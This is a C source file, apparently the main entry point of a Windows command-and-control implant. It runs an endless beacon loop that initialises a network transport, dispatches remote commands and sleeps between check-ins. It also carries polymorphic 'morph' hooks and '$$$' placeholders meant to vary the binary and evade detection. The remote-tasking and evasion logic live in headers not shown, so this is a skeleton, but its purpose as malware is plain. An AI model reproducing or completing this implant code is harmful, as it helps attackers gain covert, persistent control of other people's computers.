#pragma clang diagnostic push
#pragma ide diagnostic ignored "EndlessLoop"

#include <Revnt.h>
#include <Config.h>
#include <Core.h>
#include <Transport.h>
#include <Command.h>
#include <Poly.h>



INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    morphModule();

    RevntInit();
#if CONFIG_POLY
    $$$
#endif
    do
    {
        if ( ! Instance.Session.Connected )
        {
            if ( TransportInit( ) )
#if CONFIG_POLY
                $$$
#endif
                CommandDispatcher();
#if CONFIG_POLY
            $$$
#endif
        }

        // Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );
#if CONFIG_POLY
        $$$
#endif
        Sleep( Instance.Config.Sleeping * 1000 );
#if CONFIG_POLY
        $$$
#endif
    } while ( TRUE );
}
#pragma clang diagnostic pop